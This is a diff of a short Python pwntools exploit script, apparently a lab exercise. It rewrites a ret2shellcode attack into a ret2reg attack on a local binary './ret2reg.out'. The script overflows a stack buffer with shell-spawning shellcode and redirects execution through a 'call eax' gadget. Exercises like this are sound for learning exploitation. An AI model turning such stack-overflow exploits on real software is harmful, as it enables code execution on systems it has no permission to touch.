@@ -1,17 +1,19 @@
 #!/usr/bin/env python
 from pwn import *
 
-EBP = 0xffffdbc0
+EBP = 0xffffcca8
 BUF = EBP - 0x6c
-BUF2 = 0x804b280
+
+CALL_EAX = 0x0804901d
+CALL_EDX = 0x0804912e
 
 if __name__ == "__main__":
     context.arch = 'i386'
     # context.log_level = 'debug'
     context.endian = 'little'
+
     shellcode = asm(shellcraft.sh())
-    p = process("./ret2shellcode.out")
-    file = ELF("./ret2shellcode.out")
-    payload = shellcode.ljust(EBP - BUF + 4, b'A') + p32(BUF2)
-    p.sendline(payload)
+    file = ELF("./ret2reg.out")
+    payload = shellcode.ljust(EBP - BUF + 4, b'A') + p32(CALL_EAX)
+    p = process(argv=["./ret2reg.out" , payload])
     p.interactive()
